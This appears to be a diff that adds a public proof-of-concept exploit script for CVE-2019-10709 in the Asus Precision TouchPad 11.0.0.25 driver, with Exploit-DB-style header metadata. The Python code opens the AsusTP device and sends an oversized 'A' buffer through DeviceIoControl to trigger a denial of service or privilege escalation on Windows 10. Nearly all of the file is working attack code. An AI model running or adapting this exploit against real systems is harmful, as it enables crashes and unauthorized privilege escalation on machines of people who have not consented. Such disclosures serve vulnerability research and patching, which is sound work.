@@ -1,0 +1,24 @@
+#!/usr/bin/python
+# Exploit Title: Asus Precision TouchPad 11.0.0.25 - DoS/Privesc
+# Date: 29-08-2019
+# Exploit Author: Athanasios Tserpelis of Telspace Systems
+# Vendor Homepage: https://www.asus.com
+# Version: 11.0.0.25
+# Software Link : https://www.asus.com
+# Contact: services[@]telspace.co.za
+# Twitter: @telspacesystems (Greets to the Telspace Crew)
+# Tested on: Windows 10 RS5 x64
+# CVE: CVE-2019-10709
+
+from ctypes import * 
+kernel32 = windll.kernel32 
+ntdll = windll.ntdll 
+NULL = 0 
+hevDevice = kernel32.CreateFileA("\\\\.\\AsusTP", 0xC0000000, 0, None, 0x3, 0, None) 
+if not hevDevice or hevDevice == -1:
+    print "*** Couldn't get Device Driver handle."
+    sys.exit(0) 
+
+buf = "A"*12048 
+raw_input("Press Enter to Trigger Vuln") 
+kernel32.DeviceIoControl(hevDevice, 0x221408, buf, 0x1, buf, 0x1 , 0, NULL)
